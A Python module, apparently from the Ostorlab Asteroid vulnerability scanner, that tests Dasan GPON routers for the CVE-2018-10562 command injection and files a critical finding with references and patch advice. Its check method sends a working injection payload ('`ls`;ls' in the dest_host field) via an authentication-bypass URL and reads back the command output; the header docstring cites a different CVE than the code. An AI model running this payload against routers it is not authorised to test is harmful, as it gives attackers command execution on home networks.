"""Agent Asteroid implementation for CVE-2021-22941"""

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "Dasan GPON Routers Command Injection Vulnerability"
VULNERABILITY_REFERENCE = "CVE-2018-10562"
VULNERABILITY_DESCRIPTION = (
    "Dasan GPON home routers suffer from a Command Injection vulnerability. The issue occurs via the `dest_host`"
    " parameter in a `diag_action=ping` request to a `GponForm/diag_Form` URI."
)

DEFAULT_TIMEOUT = 90


@exploits_registry.register
class CVE201810562Exploit(definitions.Exploit):
    """CVE-2018-10562: Dasan GPON Routers Command Injection Vulnerability."""

    def accept(self, target: definitions.Target) -> bool:
        target_uri = f"{target.scheme}://{target.host}"
        try:
            requests.get(target_uri, verify=False, timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False

        # TODO(alaeddine): Consider testing for '/?images/', '/GponForm/diag_Form?images/', '/diag.html?images/'.
        return True

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        target_uri = f"{target.scheme}://{target.host}"
        data = {
            "XWebPageName": "diag",
            "diag_action": "ping",
            "wan_conlist": "0",
            # Test for a simple `ls` command.
            "dest_host": "`ls`;ls",
            "ipv": "0",
        }

        try:
            requests.post(
                target_uri + "/GponForm/diag_Form?images/",
                data=data,
                verify=False,
                timeout=DEFAULT_TIMEOUT,
            )
            response = requests.get(
                target_uri + "/diag.html?images/",
                verify=False,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []
        if "diag_result" not in response.text:
            return []

        vulnerability = self._generate_vulnerability_object(target_uri, response.text)
        return [vulnerability]

    def _generate_vulnerability_object(
        self, target_uri: str, response_body: str
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "VPN Mentor Technical Details": "https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/",
                "Exploit-Database PoC": "https://www.exploit-db.com/exploits/44576",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target_uri} is vulnerable to {VULNERABILITY_REFERENCE},"
            f" {VULNERABILITY_TITLE}.\n```\n{response_body}\n```\n"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
